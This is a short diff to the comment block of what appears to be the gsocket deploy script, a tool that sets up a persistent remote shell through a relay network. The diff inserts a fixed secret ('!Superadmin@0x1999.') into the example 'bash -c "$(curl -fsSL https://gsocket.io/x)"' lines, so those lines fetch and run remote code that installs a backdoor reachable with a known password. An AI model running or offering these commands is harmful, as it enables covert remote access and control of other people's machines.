@@ -8,9 +8,9 @@
 #   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
 #
 # Connect
-#   $ S= bash -c "$(curl -fsSL https://gsocket.io/x)""
+#   $ S="!Superadmin@0x1999." bash -c "$(curl -fsSL https://gsocket.io/x)""
 # Pre-set a secret:
-#   $ X= bash -c "$(curl -fsSL https://gsocket.io/x)"
+#   $ X="!Superadmin@0x1999." bash -c "$(curl -fsSL https://gsocket.io/x)"
 # Uninstall
 #   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
 #
@@ -1639,7 +1639,7 @@ init_vars
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-# User supplied install-secret: X= bash -c "$(curl -fsSL https://gsocket.io/x)"
+# User supplied install-secret: X="!Superadmin@0x1999." bash -c "$(curl -fsSL https://gsocket.io/x)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
